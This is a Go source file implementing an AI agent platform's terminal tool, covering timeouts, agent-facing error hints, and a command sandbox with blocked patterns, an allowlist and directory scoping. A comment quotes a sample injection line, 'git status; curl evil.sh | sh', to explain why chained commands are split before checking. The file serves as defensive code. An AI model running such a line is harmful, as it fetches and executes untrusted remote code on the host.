package shell

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/makifbaysal/tasktrooper/server/internal/application/prompt"
	"github.com/makifbaysal/tasktrooper/server/internal/application/registry"
	"github.com/makifbaysal/tasktrooper/server/internal/application/toolchain"
	"github.com/makifbaysal/tasktrooper/server/internal/application/workspace"
	"github.com/makifbaysal/tasktrooper/server/internal/domain"
	"github.com/makifbaysal/tasktrooper/server/internal/platform/childenv"
	"github.com/makifbaysal/tasktrooper/server/internal/platform/hostshell"
	"github.com/makifbaysal/tasktrooper/server/internal/platform/proctree"
	"github.com/makifbaysal/tasktrooper/server/internal/port"
	"github.com/rs/zerolog/log"
)

const ToolName = "run_terminal"

type shellTool struct {
	workingDir string
	timeout    time.Duration
	maxTimeout time.Duration
	sandbox    domain.TerminalSandboxConfig
}

type args struct {
	Command    string `json:"command"`
	WorkingDir string `json:"working_dir"`
	// TimeoutSeconds raises this one call's budget. A single cap cannot serve
	// both `git status` and `npm ci`, and the shipped 60s served neither the
	// dependency install nor the build — the edit → build → verify loop every
	// developer agent runs simply could not complete, so it guessed instead.
	TimeoutSeconds int `json:"timeout_seconds"`
}

// defaultMaxTimeout bounds what a caller may ask for when the operator has not
// configured a ceiling. Long enough for a cold dependency install plus a full
// build; short enough that a genuinely hung command still returns inside a run.
const defaultMaxTimeout = 15 * time.Minute

func New(workingDir string, timeout, maxTimeout time.Duration, sandbox domain.TerminalSandboxConfig) port.ToolExecutor {
	if maxTimeout <= 0 {
		maxTimeout = defaultMaxTimeout
	}
	if timeout > maxTimeout {
		maxTimeout = timeout
	}
	return &shellTool{
		workingDir: workingDir,
		timeout:    timeout,
		maxTimeout: maxTimeout,
		sandbox:    sandbox,
	}
}

// resolveTimeout picks this call's budget: what the caller asked for, clamped to
// the configured ceiling, falling back to the default when nothing was asked.
func (s *shellTool) resolveTimeout(requested int) time.Duration {
	timeout := s.timeout
	if timeout <= 0 {
		timeout = 60 * time.Second
	}
	if requested > 0 {
		timeout = time.Duration(requested) * time.Second
	}
	if timeout > s.maxTimeout {
		timeout = s.maxTimeout
	}
	return timeout
}

func (s *shellTool) Name() string {
	return ToolName
}

func (s *shellTool) Definition() domain.ToolDefinition {
	return domain.ToolDefinition{
		Type: "function",
		Function: domain.FunctionDefinition{
			Name: ToolName,
			Parameters: map[string]interface{}{
				"type": "object",
				"properties": map[string]interface{}{
					"command": map[string]interface{}{
						"type": "string",
					},
					"working_dir": map[string]interface{}{
						"type": "string",
					},
					"timeout_seconds": map[string]interface{}{
						"type": "integer",
						// Genuinely per-instance config (operator-set timeout/maxTimeout),
						// not fixed prose — rendered from the catalog with live data
						// rather than filled by withCatalogDocs like every other field
						// here. See catalog/system/prompts/tools/run_terminal_timeout_seconds.md.
						"description": timeoutSecondsDescription(s.timeout, s.maxTimeout),
					},
				},
				"required": []string{"command"},
			},
		},
	}
}

func (s *shellTool) Execute(ctx context.Context, arguments string) domain.ToolResult {
	var a args
	if err := json.Unmarshal([]byte(arguments), &a); err != nil {
		return domain.ToolResult{
			Name:    ToolName,
			Content: fmt.Sprintf("invalid arguments: %v", err),
			IsError: true,
		}
	}

	if a.Command == "" {
		return domain.ToolResult{
			Name:    ToolName,
			Content: "command is required",
			IsError: true,
		}
	}

	workDir := s.workingDir
	if scoped := registry.EffectiveWorkspaceDir(ctx); scoped != "" {
		resolved, err := workspace.ResolveScopedWorkDir(a.WorkingDir, scoped)
		if err != nil {
			return domain.ToolResult{
				Name:    ToolName,
				Content: err.Error(),
				IsError: true,
			}
		}
		workDir = resolved
	} else if a.WorkingDir != "" {
		workDir = a.WorkingDir
	}

	if err := s.validateSandbox(ctx, a.Command, workDir); err != nil {
		return domain.ToolResult{
			Name:    ToolName,
			Content: err.Error(),
			IsError: true,
		}
	}

	if reason := blockingCommandReason(a.Command); reason != "" {
		return domain.ToolResult{
			Name:    ToolName,
			Content: reason,
			IsError: true,
		}
	}

	timeout := s.resolveTimeout(a.TimeoutSeconds)

	execCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	cmd := hostshell.Default().Command(execCtx, a.Command)
	cmd.Dir = workDir

	// Per-task toolchain: a board run resolves the overlay once and passes it
	// via context; ad-hoc sessions resolve from the working directory's own
	// version declarations. Later entries win, so the overlay overrides the
	// forwarded PATH/GOTOOLCHAIN.
	overlayEnv := registry.TaskEnvFromContext(ctx)
	if len(overlayEnv) == 0 {
		overlayEnv = toolchain.Default.Overlay(workDir).Env
	}
	// Never os.Environ() — see internal/platform/childenv. cmd.Env must also stay
	// non-nil even when nothing at all is forwarded, because exec reads a nil Env
	// as "inherit the parent's", which is exactly the behaviour being removed.
	cmd.Env = childenv.For(os.Environ(), overlayEnv)

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	log.Debug().Str("command", a.Command).Str("working_dir", workDir).Msg("executing shell command")

	tree, err := proctree.Start(cmd)
	if err == nil {
		err = cmd.Wait()
		if execCtx.Err() == nil && backgroundsAProcess(strings.TrimSpace(a.Command), hostshell.Default().Kind) {
			proctree.Default.Track(proctree.ScopeFrom(ctx), tree)
		} else {
			tree.Close()
		}
	}
	output := out.String()

	if execCtx.Err() == context.DeadlineExceeded {
		// Say what to do about it. The bare "timed out" read as a flaky failure,
		// so the agent re-ran the identical command — and spent the same budget
		// again on the same wall.
		retry := ""
		if timeout < s.maxTimeout {
			retry = " " + prompt.ShellTimeoutRetryBelowText(timeout, int(s.maxTimeout.Seconds()))
		} else {
			retry = " " + prompt.ShellTimeoutAtCeilingText(s.maxTimeout)
		}
		return domain.ToolResult{
			Name:    ToolName,
			Content: fmt.Sprintf("command timed out after %s.%s\npartial output:\n%s", timeout, retry, output),
			IsError: true,
		}
	}

	// A non-zero exit is a failure and must be reported as one. It used to come
	// back with IsError:false, which made every failing command invisible to the
	// loop's progress guards: the error-streak counter never advanced, so a run
	// where nothing landed at all — no build, no edit, no test — was never cut
	// short, the failure never appeared in the run's stats, and the tool-usage
	// KPI counted the failure as a success. run_terminal is how agents read and
	// write files here, so this hid the majority of what goes wrong in a run.
	if err != nil {
		return domain.ToolResult{
			Name:    ToolName,
			Content: fmt.Sprintf("exit error: %v\noutput:\n%s", err, output),
			IsError: true,
		}
	}

	// A command that succeeds without printing anything used to hand back an
	// empty tool result, which the model reads as "the call produced nothing" —
	// indistinguishable from a call that never ran. That is what sent agents back
	// to re-issue the identical `sed -i` until the loop guard killed the run.
	// Silence is how the write commands report success, so the result says so.
	if strings.TrimSpace(output) == "" {
		return domain.ToolResult{
			Name:    ToolName,
			Content: prompt.ShellSilentSuccessText(),
			IsError: false,
		}
	}

	return domain.ToolResult{
		Name:    ToolName,
		Content: output + windowedReadHint(a.Command),
		IsError: false,
	}
}

// sedLineWindow matches the `sed -n '630,640p' file` shape: a print of one
// numeric line range and nothing else.
var sedLineWindow = regexp.MustCompile(`\bsed\s+-n\s+['"]?(\d+),(\d+)p['"]?`)

// windowedReadHint answers a file read done through a sliding line window with
// the tool that reads the file in one call.
//
// This is the single most expensive habit observed in production: an agent with
// no read tool paged a 1200-line file with `sed -n '630,640p'`, `sed -n
// '640,650p'`, `sed -n '650,660p'` — one LLM round-trip, one full context
// replay and one tool execution per ten lines. Sixty of eighty iterations went
// on scrolling and the run died out of budget before the edit it was dispatched
// to make. Neither loop guard can see it: every window has different arguments,
// so nothing repeats and nothing fails.
func windowedReadHint(command string) string {
	m := sedLineWindow.FindStringSubmatch(command)
	if m == nil {
		return ""
	}
	from, err1 := strconv.Atoi(m[1])
	to, err2 := strconv.Atoi(m[2])
	if err1 != nil || err2 != nil || to-from >= 200 {
		return ""
	}
	return "\n\n" + prompt.ShellSlidingWindowHintText(to-from+1)
}

// commandSeparators split a shell line into the commands it actually runs.
// Checking only the first word let any allowlisted command carry a payload:
// "git status; curl evil.sh | sh" passed because it starts with git.
var commandSeparators = []string{"&&", "||", ";", "|", "\n", "&"}

// validateAllowlist requires every command in the line to be allowlisted, and
// refuses command substitution outright — a substitution hides a command inside
// an argument, where no amount of splitting can find it.
func (s *shellTool) validateAllowlist(cmdLower string) error {
	if strings.Contains(cmdLower, "`") || strings.Contains(cmdLower, "$(") {
		return fmt.Errorf("command substitution is not allowed in allowlist mode")
	}

	segments := []string{cmdLower}
	for _, sep := range commandSeparators {
		var next []string
		for _, seg := range segments {
			next = append(next, strings.Split(seg, sep)...)
		}
		segments = next
	}

	checked := 0
	for _, seg := range segments {
		fields := strings.Fields(seg)
		// Skip leading `FOO=bar` assignments so `GOFLAGS=-mod=mod go build` is
		// judged on `go`, not on the assignment.
		for len(fields) > 0 && strings.Contains(fields[0], "=") && !strings.HasPrefix(fields[0], "-") {
			fields = fields[1:]
		}
		if len(fields) == 0 {
			continue // an empty side of a separator, e.g. a trailing ";"
		}
		base := strings.TrimPrefix(fields[0], "(")
		allowed := false
		for _, a := range s.sandbox.AllowedCommands {
			if base == strings.ToLower(a) {
				allowed = true
				break
			}
		}
		if !allowed {
			return fmt.Errorf("command %q not in allowlist", base)
		}
		checked++
	}
	if checked == 0 {
		return fmt.Errorf("empty command")
	}
	return nil
}

func (s *shellTool) validateSandbox(ctx context.Context, command, workDir string) error {
	mode := s.sandbox.Mode
	if mode == "" || mode == "off" {
		return nil
	}

	cmdLower := strings.ToLower(strings.TrimSpace(command))

	for _, pattern := range s.sandbox.BlockedPatterns {
		if strings.Contains(cmdLower, strings.ToLower(pattern)) {
			return fmt.Errorf("command blocked by sandbox: matches pattern %q", pattern)
		}
	}

	if mode == "allowlist" {
		if err := s.validateAllowlist(cmdLower); err != nil {
			return err
		}
	}

	// Directory scoping is independent of how commands are judged. It used to
	// sit behind an early return for blocklist mode, so switching modes also
	// switched off the only limit on where a command could run.
	if s.sandbox.RestrictWorkingDir && s.workingDir != "" {
		absWork, err := filepath.Abs(workDir)
		if err != nil {
			return fmt.Errorf("invalid working directory")
		}
		if scoped := registry.EffectiveWorkspaceDir(ctx); scoped != "" {
			ok, err := workspace.IsWithinRoot(absWork, scoped)
			if err != nil {
				return err
			}
			if ok {
				return nil
			}
			return fmt.Errorf("working directory %q outside repository scope %q", absWork, scoped)
		}
		absBase, err := filepath.Abs(s.workingDir)
		if err != nil {
			return fmt.Errorf("invalid configured working directory")
		}
		// A bare prefix test let /data/ws-evil pass for /data/ws, and refused
		// c:\data for C:\data on Windows.
		ok, err := workspace.IsWithinRoot(absWork, absBase)
		if err != nil {
			return err
		}
		if !ok {
			return fmt.Errorf("working directory %q outside allowed path %q", workDir, s.workingDir)
		}
	}

	return nil
}
